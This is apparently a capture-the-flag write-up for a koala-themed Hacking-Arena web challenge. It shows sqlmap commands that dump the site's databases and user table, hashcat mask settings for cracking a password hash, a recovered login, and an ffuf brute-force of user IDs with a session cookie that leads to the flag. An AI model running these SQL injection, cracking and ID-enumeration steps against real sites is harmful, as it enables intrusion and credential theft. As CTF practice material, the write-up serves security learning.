# Flag

> Hacking-Arena{Oh_don't_you_please_take_me_home}

# Prompt

> I need to login to look after what my koala bears are doing. I forgot the password, holy cow(la)!

[http://koala.hackingarena.no:802](http://koala.hackingarena.no:802/) [http://koala.hackingarena.com:802](http://koala.hackingarena.com:802/) (same site)

I think you can get it as well as the flag. Need a little patience, cracking might take 20 minutes (if you know what to crack :) )

# Solution

Utilize SQLMAP to exploit the HTTP Get form and retrieve databases

GET http://koala.hackingarena.com:802/index.php?song=Banana boat song

Command:
sqlmap -u "http://koala.hackingarena.com:802/index.php" --forms -dbs

![[Pasted image 20241115183959.png]]

Next exploit is for retrieving tables from database 'user' using command:
sqlmap -u "http://koala.hackingarena.com:802/index.php" --forms -D user --tables  

![[Pasted image 20241115184128.png]]

Lastly for sqlmap, output content from table users to retrieve password and usernames.

![[Pasted image 20241115184226.png]]

From here on, go back to the website and inspect the source code for the instructions to creating passwords. Use the structure and crack the hash(es) using hash-cat with following structure:

Lowercase - ?l
Uppercase - ?u
Digits - ?d
Minimum length of 6 - --increment-min 6 & -i ?1?1?1?1?1?1?1?1?1?1?1?1 (6-12 length)

![[Pasted image 20241115184444.png]]

Next step is to log into the website with login information:
Name=yellowfish
Password=32uSOp

![[Pasted image 20241115184734.png]]

Use burp suite to find the cookieId and use ffuf to bruteforce userIds from 1 to 10000 (filter out size = 29):

ffuf -u http://koala.hackingarena.no:802/profile.php?userid=FUZZ -H "Cookie: CalypId=AAABBBCCCDDD1731694671" -w "/home/kali/Desktop/userid.txt" -fs 29

![[Pasted image 20241115184929.png]]

Lastly, manually change the userId in the url of a web-browser to 7622 (Largest size) and retrieve the flag.
# Additional Info

Additional solution / info